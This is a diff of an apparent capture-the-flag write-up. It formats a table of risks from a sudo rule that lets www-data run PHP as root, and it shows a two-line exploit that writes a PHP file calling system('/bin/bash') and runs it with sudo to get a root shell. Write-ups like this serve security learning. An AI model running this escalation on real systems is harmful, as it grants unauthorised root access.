@@ -34,12 +34,12 @@ Running these permissions through ChatGPT we can get a more human readable threa
 
 ### Security Risks
 
-| **Risk**                        | **Description**                                                    |
-|---------------------------------|--------------------------------------------------------------------|
-| **Full Root Access**            | PHP can execute system commands (e.g., `system()`, `exec()`), allowing full root control. |
-| **Privilege Escalation**        | Attackers can: <ul><li>Read/modify sensitive files (e.g., `/etc/shadow`).</li><li>Open a root shell via PHP.</li></ul> |
-| **Ease of Exploitation**        | No password is required to run PHP scripts as root, simplifying exploitation. |
-| **Web Exploits**                | If `www-data` is tied to a web server, vulnerable web apps can be used to escalate privileges to root. |
+| **Risk**                 | **Description**                                                                                                        |
+| ------------------------ | ---------------------------------------------------------------------------------------------------------------------- |
+| **Full Root Access**     | PHP can execute system commands (e.g., `system()`, `exec()`), allowing full root control.                              |
+| **Privilege Escalation** | Attackers can: <ul><li>Read/modify sensitive files (e.g., `/etc/shadow`).</li><li>Open a root shell via PHP.</li></ul> |
+| **Ease of Exploitation** | No password is required to run PHP scripts as root, simplifying exploitation.                                          |
+| **Web Exploits**         | If `www-data` is tied to a web server, vulnerable web apps can be used to escalate privileges to root.                 |
 
 ### Exploit Example
 
@@ -55,7 +55,7 @@ Running these permissions through ChatGPT we can get a more human readable threa
 | **Monitor www-data**            | Track activity, especially sudo actions.                           |
 | **Harden Web Applications**     | Ensure no remote code execution vulnerabilities in web apps.       |
 
-From this we can execute a simple 2 step script as below
+From this info we can quickly execute the simple 2 line script below
 
 ```shell script
 echo '<?php system("/bin/bash"); ?>' > /tmp/root_shell.php
@@ -66,4 +66,4 @@ sudo /usr/bin/php /tmp/root_shell.php
 
 We have now established ourselves as the root user and capture the final flag.
 
-![[Pasted image 20241007221416.png]]
+![[Pasted image 20241007222806.png]]
